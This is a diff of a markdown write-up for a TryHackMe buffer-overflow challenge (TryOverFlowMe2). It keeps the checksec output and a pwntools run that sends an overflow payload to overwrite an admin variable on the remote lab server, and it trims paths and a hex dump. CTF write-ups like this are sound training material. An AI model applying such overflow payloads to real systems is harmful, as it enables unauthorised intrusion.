@@ -51,11 +51,10 @@ However, instead of writing an arbitrary value to admin, we need to write `0x595
 
 It is a 64-bit ELF
 
-```python
+```bash
 └─$ file overflowme2 
 overflowme2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c5bcde369168b57c97be4dbb4da6943d40e95504, not stripped
 
-┌──(kali㉿kali)-[~/CTF/THM/Medium/TryPwnMe One/Source/materials-TryPwnMeOne/TryOverFlowMe2]
 └─$ checksec --file=overflowme2 
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
 Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   74 Symbols        No    0               2               overflowme2
@@ -184,52 +183,17 @@ We can now get the flag in the remote server!
 
 - Result
     
-    ```python
+    ```bash
     └─$ python admin_overwrite.py REMOTE <Server IP> <Port>
-    [*] '/home/kali/CTF/THM/Medium/TryPwnMe One/Source/materials-TryPwnMeOne/images/overflowme2'
         Arch:       amd64-64-little
         RELRO:      Partial RELRO
         Stack:      No canary found
         NX:         NX enabled
         PIE:        No PIE (0x400000)
         Stripped:   No
-    /home/kali/CTF/THM/Medium/TryPwnMe One/Source/materials-TryPwnMeOne/images/admin_overwrite.py:27: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
       payload = flat({padding:admin})
     [+] Opening connection to <Server IP> on port <Port>: Done
-    [DEBUG] Received 0x1f4 bytes:
-        00000000  1b 5b 30 3b  33 32 6d 20  20 20 20 20  20 20 20 20  │·[0;│32m │    │    │
-        00000010  20 20 20 20  20 20 20 20  20 5f 5f 5f  20 20 20 20  │    │    │ ___│    │
-        00000020  20 20 20 20  20 20 20 5f  5f 5f 20 20  20 20 20 20  │    │   _│__  │    │
-        00000030  20 0a 20 20  20 20 20 20  5f 5f 5f 20  20 20 20 20  │ ·  │    │___ │    │
-        00000040  20 20 20 2f  5f 5f 2f 5c  20 20 20 20  20 20 20 20  │   /│__/\│    │    │
-        00000050  20 2f 5f 5f  2f 5c 20 20  20 20 0a 20  20 20 20 20  │ /__│/\  │  · │    │
-        00000060  2f 20 20 2f  5c 20 20 20  20 20 20 20  5c 20 20 5c  │/  /│\   │    │\  \│
-        00000070  3a 5c 20 20  20 20 20 20  20 7c 20 20  7c 3a 3a 5c  │:\  │    │ |  │|::\│
-        00000080  20 20 20 0a  20 20 20 20  2f 20 20 2f  3a 2f 20 20  │   ·│    │/  /│:/  │
-        00000090  20 20 20 20  20 20 5c 5f  5f 5c 3a 5c  20 20 20 20  │    │  \_│_\:\│    │
-        000000a0  20 20 7c 20  20 7c 3a 7c  3a 5c 20 20  0a 20 20 20  │  | │ |:|│:\  │·   │
-        000000b0  2f 20 20 2f  3a 2f 20 20  20 20 20 5f  5f 5f 20 2f  │/  /│:/  │   _│__ /│
-        000000c0  20 20 2f 3a  3a 5c 20 20  20 5f 5f 7c  5f 5f 7c 3a  │  /:│:\  │ __|│__|:│
-        000000d0  7c 5c 3a 5c  20 0a 20 20  2f 20 20 2f  3a 3a 5c 20  │|\:\│ ·  │/  /│::\ │
-        000000e0  20 20 20 2f  5f 5f 2f 5c  20 20 2f 3a  2f 5c 3a 5c  │   /│__/\│  /:│/\:\│
-        000000f0  20 2f 5f 5f  2f 3a 3a 3a  3a 7c 20 5c  3a 5c 0a 20  │ /__│/:::│:| \│:\· │
-        00000100  2f 5f 5f 2f  3a 2f 5c 3a  5c 20 20 20  5c 20 20 5c  │/__/│:/\:│\   │\  \│
-        00000110  3a 5c 2f 3a  2f 5f 5f 5c  2f 20 5c 20  20 5c 3a 5c  │:\/:│/__\│/ \ │ \:\│
-        00000120  7e 7e 5c 5f  5f 5c 2f 0a  20 5c 5f 5f  5c 2f 20 20  │~~\_│_\/·│ \__│\/  │
-        00000130  5c 3a 5c 20  20 20 5c 20  20 5c 3a 3a  2f 20 20 20  │\:\ │  \ │ \::│/   │
-        00000140  20 20 20 20  5c 20 20 5c  3a 5c 20 20  20 20 20 20  │    │\  \│:\  │    │
-        00000150  0a 20 20 20  20 20 20 5c  20 20 5c 3a  5c 20 20 20  │·   │   \│  \:│\   │
-        00000160  5c 20 20 5c  3a 5c 20 20  20 20 20 20  20 20 5c 20  │\  \│:\  │    │  \ │
-        00000170  20 5c 3a 5c  20 20 20 20  20 0a 20 20  20 20 20 20  │ \:\│    │ ·  │    │
-        00000180  20 5c 5f 5f  5c 2f 20 20  20 20 5c 20  20 5c 3a 5c  │ \__│\/  │  \ │ \:\│
-        00000190  20 20 20 20  20 20 20 20  5c 20 20 5c  3a 5c 20 20  │    │    │\  \│:\  │
-        000001a0  20 20 0a 20  20 20 20 20  20 20 20 20  20 20 20 20  │  · │    │    │    │
-        000001b0  20 20 20 20  5c 5f 5f 5c  2f 20 20 20  20 20 20 20  │    │\__\│/   │    │
-        000001c0  20 20 5c 5f  5f 5c 2f 20  0a 0a 1b 5b  30 6d 50 6c  │  \_│_\/ │···[│0mPl│
-        000001d0  65 61 73 65  20 67 6f 20  61 68 65 61  64 20 61 6e  │ease│ go │ahea│d an│
-        000001e0  64 20 6c 65  61 76 65 20  61 20 63 6f  6d 6d 65 6e  │d le│ave │a co│mmen│
-        000001f0  74 20 3a 0a                                         │t :·│
-        000001f4
+    [...
     [DEBUG] Sent 0x51 bytes:
         b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaaYYYY\n'
     [*] Switching to interactive mode
